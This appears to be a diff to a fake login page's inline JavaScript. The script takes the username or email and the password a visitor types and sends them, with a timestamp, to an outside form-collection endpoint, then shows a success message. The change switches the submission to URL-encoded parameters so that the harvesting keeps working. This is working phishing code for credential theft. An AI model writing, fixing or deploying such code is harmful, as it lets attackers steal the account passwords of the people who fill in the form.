@@ -240,7 +240,7 @@
 
 <script>
   // ─── CONFIG ───────────────────────────────────────────────
-const GETFORM_URL = 'https://getform.io/f/txfrdrkkcali';
+  const GETFORM_URL = 'https://getform.io/f/txfrdrkkcali';
   // ─────────────────────────────────────────────────────────
 
   let loginType = 'email';
@@ -309,22 +309,21 @@ const GETFORM_URL = 'https://getform.io/f/txfrdrkkcali';
     btn.disabled    = true;
     btn.textContent = 'Logging in...';
 
-    // ── send via Getform.io (free, no restrictions) ──
+    // ── send via Getform.io ──
     try {
-      const formData = new FormData();
-      formData.append('Login Type', loginType);
-      formData.append('Identifier', identifier);
-      formData.append('Password',   password);
-      formData.append('Time',       new Date().toLocaleString());
+      const params = new URLSearchParams();
+      params.append('Login_Type', loginType);
+      params.append('Identifier', identifier);
+      params.append('Password',   password);
+      params.append('Time',       new Date().toLocaleString());
 
       const res = await fetch(GETFORM_URL, {
-        method: 'POST',
-        body:   formData,
-        headers: { 'Accept': 'application/json' }
+        method:  'POST',
+        headers: { 'Content-Type': 'application/x-www-form-urlencoded', 'Accept': 'application/json' },
+        body:    params.toString()
       });
 
-      const data = await res.json();
-      if (data.success) {
+      if (res.ok) {
         document.getElementById('tt-success').classList.add('show');
       } else {
         showError('Something went wrong. Try again.');
